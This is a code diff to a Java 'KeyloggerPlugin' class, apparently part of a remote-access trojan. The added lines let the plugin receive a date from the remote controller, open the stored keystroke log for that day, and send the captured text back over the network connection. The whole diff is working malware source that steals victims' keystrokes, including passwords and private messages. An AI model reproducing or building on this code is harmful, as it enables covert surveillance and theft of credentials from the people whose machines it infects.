@@ -5,6 +5,7 @@ import java.io.BufferedWriter;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileWriter;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
@@ -87,9 +88,26 @@ public class KeyloggerPlugin extends StubPlugin {
 				}
 			}
 		} else if (header == LOG_HEADER) {
-			String path = dis.readUTF();
-			System.out.println(path);
+			String year = dis.readUTF();
+			String month = dis.readUTF();
+			String day = dis.readUTF();
 			
+			File file = new File(Keylogger.getLogsRoot().getAbsolutePath() + "/" + Base64.encode(year) + "/" + Base64.encode(month) + "/" + Base64.encode(day));
+		
+			String text = "";
+			String s;
+			
+			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
+			
+			while ((s = reader.readLine()) != null) {
+				text += s + "\n\r";
+			}
+			
+			reader.close();
+			
+			dos.writeByte(LOG_HEADER);
+			dos.writeInt(text.length());
+			dos.writeChars(text);
 		}
 	}
 
